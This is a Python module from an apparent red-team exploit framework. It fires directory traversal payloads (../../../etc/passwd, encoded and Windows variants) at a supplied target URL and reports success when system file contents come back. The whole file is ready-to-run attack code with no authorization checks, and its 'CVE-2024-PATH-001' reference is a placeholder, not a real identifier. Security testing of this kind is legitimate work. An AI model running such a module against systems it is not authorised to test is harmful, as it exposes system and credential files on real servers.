"""
Path Traversal Exploit (CWE-22) - Directory traversal attack.

Tests for path traversal via ../ sequences.

Author: MAXIMUS Wargaming Team  
Date: 2025-10-11
"""

import asyncio
import httpx
import time

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


EXPLOIT_ID = "cwe_22_path_traversal"
NAME = "Path Traversal"
DESCRIPTION = "Tests for directory traversal via ../ and encoded variants"
CATEGORY = "path_traversal"
CWE_IDS = ["CWE-22"]
CVE_EXAMPLES = ["CVE-2024-PATH-001"]


async def execute(target_url: str, timeout: int = 30, **kwargs) -> ExploitResult:
    """Execute path traversal exploit"""
    start_time = time.time()
    output_lines = []
    
    try:
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]
        
        param_name = kwargs.get("param_name", "file")
        
        async with httpx.AsyncClient(timeout=timeout) as client:
            for payload in payloads:
                output_lines.append(f"Testing: {payload[:30]}...")
                
                params = {param_name: payload}
                
                try:
                    response = await client.get(target_url, params=params)
                    response_text = response.text.lower()
                    
                    indicators = ["root:", "/bin/bash", "daemon:", "[extensions]"]
                    
                    for indicator in indicators:
                        if indicator in response_text:
                            duration = time.time() - start_time
                            output_lines.append(f"✓ Path traversal confirmed: '{indicator}' in response")
                            
                            return ExploitResult(
                                exploit_id=EXPLOIT_ID,
                                category=ExploitCategory(CATEGORY),
                                status=ExploitStatus.SUCCESS,
                                success=True,
                                output="\n".join(output_lines),
                                error=None,
                                duration_seconds=duration,
                                metadata={"payload": payload, "indicator": indicator}
                            )
                    
                    output_lines.append("  No indicators found")
                    
                except httpx.HTTPError as e:
                    output_lines.append(f"  Error: {e}")
        
        duration = time.time() - start_time
        output_lines.append("✗ No path traversal detected (likely patched)")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.FAILED,
            success=False,
            output="\n".join(output_lines),
            error=None,
            duration_seconds=duration,
            metadata={}
        )
        
    except asyncio.TimeoutError:
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error="Timeout",
            duration_seconds=time.time() - start_time,
            metadata={}
        )
    
    except Exception as e:
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=time.time() - start_time,
            metadata={}
        )
